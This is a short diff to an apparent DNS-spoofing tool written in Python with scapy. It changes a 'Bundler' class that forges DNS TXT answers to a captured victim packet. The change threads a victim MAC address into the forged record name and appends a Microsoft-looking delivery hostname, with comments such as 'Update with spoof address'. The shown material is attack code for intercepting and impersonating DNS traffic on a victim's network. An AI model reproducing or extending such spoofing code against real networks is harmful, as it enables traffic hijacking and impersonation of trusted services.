@@ -4,7 +4,8 @@ from scapy.all import *
 
 class Bundler():
 
-    def __init__(self, victim_packet):
+    def __init__(self, victim_mac, victim_packet):
+        self.victim_mac = victim_mac
         self.victim_packet = victim_packet
         self.fake_hostname = self.victim_packet.getlayer(DNSQR).qname
         self.victim_id = victim_packet.getlayer(Ether).src
@@ -42,7 +43,7 @@ class Bundler():
             ns=None, ar=None,
             qd = dnsqr_layer,
             an = DNSRR(
-                rrname=dnsqr_layer.qname, # Update with spoof address
+                rrname=self.victim_mac.minify() + '.cp501-prod.do.dsp.microsoft.com', # Update with spoof address
                 type='TXT',
                 rclass='IN', # Update?
                 ttl=700,
